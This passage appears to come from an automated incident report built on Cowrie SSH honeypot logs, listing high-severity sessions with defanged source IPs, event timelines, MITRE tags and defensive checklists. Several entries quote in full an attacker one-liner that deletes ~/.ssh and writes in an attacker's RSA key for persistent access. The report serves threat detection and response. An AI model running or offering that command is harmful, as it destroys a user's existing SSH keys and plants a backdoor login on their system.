| `2026-04-08 10:21:04` | `cowrie.command.failed` |
| `2026-04-08 10:21:07` | `cowrie.log.closed` |
| `2026-04-08 10:21:07` | `cowrie.session.params` |
| `2026-04-08 10:21:07` | `cowrie.command.input` |
| `2026-04-08 10:21:11` | `cowrie.session.file_download` |
| `2026-04-08 10:21:11` | `cowrie.log.closed` |
| `2026-04-08 10:21:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.2.83[.]149` to AbuseIPDB if not already reported
- [ ] Block `20.2.83[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e05973034625

| Field | Detail |
|---|---|
| **Source IP** | `20.2.83[.]149` |
| **First Seen** | 2026-04-08 10:21 |
| **Last Seen** | 2026-04-08 10:21 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:21:19` | `cowrie.session.connect` |
| `2026-04-08 10:21:20` | `cowrie.client.version` |
| `2026-04-08 10:21:20` | `cowrie.client.kex` |
| `2026-04-08 10:21:28` | `cowrie.login.success` |
| `2026-04-08 10:21:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.2.83[.]149` to AbuseIPDB if not already reported
- [ ] Block `20.2.83[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8c47cd1f284

| Field | Detail |
|---|---|
| **Source IP** | `103.210.21[.]242` |
| **First Seen** | 2026-04-08 10:22 |
| **Last Seen** | 2026-04-08 10:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:22:29` | `cowrie.session.connect` |
| `2026-04-08 10:22:29` | `cowrie.client.version` |
| `2026-04-08 10:22:29` | `cowrie.client.kex` |
| `2026-04-08 10:22:29` | `cowrie.login.success` |
| `2026-04-08 10:22:30` | `cowrie.session.params` |
| `2026-04-08 10:22:30` | `cowrie.command.input` |
| `2026-04-08 10:22:30` | `cowrie.command.failed` |
| `2026-04-08 10:22:30` | `cowrie.log.closed` |
| `2026-04-08 10:22:30` | `cowrie.session.params` |
| `2026-04-08 10:22:30` | `cowrie.command.input` |
| `2026-04-08 10:22:30` | `cowrie.session.file_download` |
| `2026-04-08 10:22:30` | `cowrie.log.closed` |
| `2026-04-08 10:22:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.210.21[.]242` to AbuseIPDB if not already reported
- [ ] Block `103.210.21[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e30a8968cd65

| Field | Detail |
|---|---|
| **Source IP** | `103.210.21[.]242` |
| **First Seen** | 2026-04-08 10:22 |
| **Last Seen** | 2026-04-08 10:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:22:32` | `cowrie.session.connect` |
| `2026-04-08 10:22:32` | `cowrie.client.version` |
| `2026-04-08 10:22:32` | `cowrie.client.kex` |
| `2026-04-08 10:22:33` | `cowrie.login.success` |
| `2026-04-08 10:22:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.210.21[.]242` to AbuseIPDB if not already reported
- [ ] Block `103.210.21[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5efaa6b1d85e

| Field | Detail |
|---|---|
| **Source IP** | `112.217.199[.]222` |
| **First Seen** | 2026-04-08 10:26 |
| **Last Seen** | 2026-04-08 10:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:26:44` | `cowrie.session.connect` |
| `2026-04-08 10:26:44` | `cowrie.client.version` |
| `2026-04-08 10:26:44` | `cowrie.client.kex` |
| `2026-04-08 10:26:45` | `cowrie.login.success` |
| `2026-04-08 10:26:45` | `cowrie.session.params` |
| `2026-04-08 10:26:45` | `cowrie.command.input` |
| `2026-04-08 10:26:45` | `cowrie.command.failed` |
| `2026-04-08 10:26:45` | `cowrie.log.closed` |
| `2026-04-08 10:26:45` | `cowrie.session.params` |
| `2026-04-08 10:26:45` | `cowrie.command.input` |
| `2026-04-08 10:26:46` | `cowrie.session.file_download` |
| `2026-04-08 10:26:46` | `cowrie.log.closed` |
| `2026-04-08 10:26:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.199[.]222` to AbuseIPDB if not already reported
- [ ] Block `112.217.199[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88a9c35aa01a

| Field | Detail |
|---|---|
| **Source IP** | `112.217.199[.]222` |
| **First Seen** | 2026-04-08 10:26 |
| **Last Seen** | 2026-04-08 10:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:26:48` | `cowrie.session.connect` |
| `2026-04-08 10:26:48` | `cowrie.client.version` |
| `2026-04-08 10:26:48` | `cowrie.client.kex` |
| `2026-04-08 10:26:49` | `cowrie.login.success` |
| `2026-04-08 10:26:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.199[.]222` to AbuseIPDB if not already reported
- [ ] Block `112.217.199[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c33eabc96c3

| Field | Detail |
|---|---|
| **Source IP** | `112.217.199[.]222` |
| **First Seen** | 2026-04-08 10:28 |
| **Last Seen** | 2026-04-08 10:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:28:27` | `cowrie.session.connect` |
| `2026-04-08 10:28:27` | `cowrie.client.version` |
| `2026-04-08 10:28:27` | `cowrie.client.kex` |
| `2026-04-08 10:28:28` | `cowrie.login.success` |
| `2026-04-08 10:28:28` | `cowrie.session.params` |
| `2026-04-08 10:28:28` | `cowrie.command.input` |
| `2026-04-08 10:28:28` | `cowrie.command.failed` |
| `2026-04-08 10:28:28` | `cowrie.log.closed` |
| `2026-04-08 10:28:29` | `cowrie.session.params` |
| `2026-04-08 10:28:29` | `cowrie.command.input` |
| `2026-04-08 10:28:29` | `cowrie.session.file_download` |
| `2026-04-08 10:28:29` | `cowrie.log.closed` |
| `2026-04-08 10:28:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.199[.]222` to AbuseIPDB if not already reported
- [ ] Block `112.217.199[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6af37d36768

| Field | Detail |
|---|---|
| **Source IP** | `112.217.199[.]222` |
| **First Seen** | 2026-04-08 10:28 |
| **Last Seen** | 2026-04-08 10:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:28:31` | `cowrie.session.connect` |
| `2026-04-08 10:28:31` | `cowrie.client.version` |
| `2026-04-08 10:28:31` | `cowrie.client.kex` |
| `2026-04-08 10:28:32` | `cowrie.login.success` |
| `2026-04-08 10:28:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.199[.]222` to AbuseIPDB if not already reported
- [ ] Block `112.217.199[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a2c0334b537

| Field | Detail |
|---|---|
| **Source IP** | `103.210.21[.]242` |
| **First Seen** | 2026-04-08 10:29 |
| **Last Seen** | 2026-04-08 10:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:29:06` | `cowrie.session.connect` |
| `2026-04-08 10:29:06` | `cowrie.client.version` |
| `2026-04-08 10:29:06` | `cowrie.client.kex` |
| `2026-04-08 10:29:07` | `cowrie.login.success` |
| `2026-04-08 10:29:07` | `cowrie.session.params` |
| `2026-04-08 10:29:07` | `cowrie.command.input` |
| `2026-04-08 10:29:07` | `cowrie.command.failed` |
| `2026-04-08 10:29:07` | `cowrie.log.closed` |
| `2026-04-08 10:29:07` | `cowrie.session.params` |
| `2026-04-08 10:29:07` | `cowrie.command.input` |
| `2026-04-08 10:29:07` | `cowrie.session.file_download` |
| `2026-04-08 10:29:07` | `cowrie.log.closed` |
| `2026-04-08 10:29:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.210.21[.]242` to AbuseIPDB if not already reported
- [ ] Block `103.210.21[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4d18dbf66e2

| Field | Detail |
|---|---|
| **Source IP** | `103.210.21[.]242` |
| **First Seen** | 2026-04-08 10:29 |
| **Last Seen** | 2026-04-08 10:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:29:09` | `cowrie.session.connect` |
| `2026-04-08 10:29:09` | `cowrie.client.version` |
| `2026-04-08 10:29:09` | `cowrie.client.kex` |
| `2026-04-08 10:29:10` | `cowrie.login.success` |
| `2026-04-08 10:29:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.210.21[.]242` to AbuseIPDB if not already reported
- [ ] Block `103.210.21[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1edf672d8a09

| Field | Detail |
|---|---|
| **Source IP** | `103.210.21[.]242` |
| **First Seen** | 2026-04-08 10:30 |
| **Last Seen** | 2026-04-08 10:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:30:48` | `cowrie.session.connect` |
| `2026-04-08 10:30:48` | `cowrie.client.version` |
| `2026-04-08 10:30:48` | `cowrie.client.kex` |
| `2026-04-08 10:30:48` | `cowrie.login.success` |
| `2026-04-08 10:30:49` | `cowrie.session.params` |
| `2026-04-08 10:30:49` | `cowrie.command.input` |
| `2026-04-08 10:30:49` | `cowrie.command.failed` |
| `2026-04-08 10:30:49` | `cowrie.log.closed` |
| `2026-04-08 10:30:49` | `cowrie.session.params` |
| `2026-04-08 10:30:49` | `cowrie.command.input` |
| `2026-04-08 10:30:49` | `cowrie.session.file_download` |
| `2026-04-08 10:30:49` | `cowrie.log.closed` |
| `2026-04-08 10:30:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.210.21[.]242` to AbuseIPDB if not already reported
- [ ] Block `103.210.21[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7e791f08051

| Field | Detail |
|---|---|
| **Source IP** | `103.210.21[.]242` |
| **First Seen** | 2026-04-08 10:30 |
| **Last Seen** | 2026-04-08 10:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:30:51` | `cowrie.session.connect` |
| `2026-04-08 10:30:51` | `cowrie.client.version` |
| `2026-04-08 10:30:51` | `cowrie.client.kex` |
| `2026-04-08 10:30:51` | `cowrie.login.success` |
| `2026-04-08 10:30:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.210.21[.]242` to AbuseIPDB if not already reported
- [ ] Block `103.210.21[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9e8b785d5ea

| Field | Detail |
|---|---|
| **Source IP** | `112.217.199[.]222` |
| **First Seen** | 2026-04-08 10:39 |
| **Last Seen** | 2026-04-08 10:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:39:00` | `cowrie.session.connect` |
| `2026-04-08 10:39:00` | `cowrie.client.version` |
| `2026-04-08 10:39:00` | `cowrie.client.kex` |
| `2026-04-08 10:39:01` | `cowrie.login.success` |
| `2026-04-08 10:39:01` | `cowrie.session.params` |
| `2026-04-08 10:39:01` | `cowrie.command.input` |
| `2026-04-08 10:39:01` | `cowrie.command.failed` |
| `2026-04-08 10:39:01` | `cowrie.log.closed` |
| `2026-04-08 10:39:02` | `cowrie.session.params` |
| `2026-04-08 10:39:02` | `cowrie.command.input` |
| `2026-04-08 10:39:02` | `cowrie.session.file_download` |
| `2026-04-08 10:39:02` | `cowrie.log.closed` |
| `2026-04-08 10:39:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.199[.]222` to AbuseIPDB if not already reported
- [ ] Block `112.217.199[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03b722cbe484

| Field | Detail |
|---|---|
| **Source IP** | `112.217.199[.]222` |
| **First Seen** | 2026-04-08 10:39 |
| **Last Seen** | 2026-04-08 10:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:39:04` | `cowrie.session.connect` |
| `2026-04-08 10:39:04` | `cowrie.client.version` |
| `2026-04-08 10:39:04` | `cowrie.client.kex` |
| `2026-04-08 10:39:05` | `cowrie.login.success` |
| `2026-04-08 10:39:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.199[.]222` to AbuseIPDB if not already reported
- [ ] Block `112.217.199[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe7b22f288e4

| Field | Detail |
|---|---|
| **Source IP** | `112.217.199[.]222` |
| **First Seen** | 2026-04-08 10:40 |
| **Last Seen** | 2026-04-08 10:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:40:40` | `cowrie.session.connect` |
| `2026-04-08 10:40:40` | `cowrie.client.version` |
| `2026-04-08 10:40:40` | `cowrie.client.kex` |
| `2026-04-08 10:40:41` | `cowrie.login.success` |
| `2026-04-08 10:40:41` | `cowrie.session.params` |
| `2026-04-08 10:40:41` | `cowrie.command.input` |
| `2026-04-08 10:40:41` | `cowrie.command.failed` |
| `2026-04-08 10:40:41` | `cowrie.log.closed` |
| `2026-04-08 10:40:42` | `cowrie.session.params` |
| `2026-04-08 10:40:42` | `cowrie.command.input` |
| `2026-04-08 10:40:42` | `cowrie.session.file_download` |
| `2026-04-08 10:40:42` | `cowrie.log.closed` |
| `2026-04-08 10:40:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.199[.]222` to AbuseIPDB if not already reported
- [ ] Block `112.217.199[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a80310904673

| Field | Detail |
|---|---|
| **Source IP** | `112.217.199[.]222` |
| **First Seen** | 2026-04-08 10:40 |
| **Last Seen** | 2026-04-08 10:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:40:44` | `cowrie.session.connect` |
| `2026-04-08 10:40:44` | `cowrie.client.version` |
| `2026-04-08 10:40:44` | `cowrie.client.kex` |
| `2026-04-08 10:40:44` | `cowrie.login.success` |
| `2026-04-08 10:40:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.199[.]222` to AbuseIPDB if not already reported
- [ ] Block `112.217.199[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d21a0fcc7d88

| Field | Detail |
|---|---|
| **Source IP** | `112.217.199[.]222` |
| **First Seen** | 2026-04-08 10:44 |
| **Last Seen** | 2026-04-08 10:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:44:10` | `cowrie.session.connect` |
| `2026-04-08 10:44:10` | `cowrie.client.version` |
| `2026-04-08 10:44:10` | `cowrie.client.kex` |
| `2026-04-08 10:44:11` | `cowrie.login.success` |
| `2026-04-08 10:44:11` | `cowrie.session.params` |
| `2026-04-08 10:44:11` | `cowrie.command.input` |
| `2026-04-08 10:44:11` | `cowrie.command.failed` |
| `2026-04-08 10:44:11` | `cowrie.log.closed` |
| `2026-04-08 10:44:11` | `cowrie.session.params` |
| `2026-04-08 10:44:11` | `cowrie.command.input` |
| `2026-04-08 10:44:12` | `cowrie.session.file_download` |
| `2026-04-08 10:44:12` | `cowrie.log.closed` |
| `2026-04-08 10:44:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.199[.]222` to AbuseIPDB if not already reported
- [ ] Block `112.217.199[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96082c2ac24b

| Field | Detail |
|---|---|
| **Source IP** | `112.217.199[.]222` |
| **First Seen** | 2026-04-08 10:44 |
| **Last Seen** | 2026-04-08 10:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:44:14` | `cowrie.session.connect` |
| `2026-04-08 10:44:14` | `cowrie.client.version` |
| `2026-04-08 10:44:14` | `cowrie.client.kex` |
| `2026-04-08 10:44:14` | `cowrie.login.success` |
| `2026-04-08 10:44:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.199[.]222` to AbuseIPDB if not already reported
- [ ] Block `112.217.199[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94317228bf2d

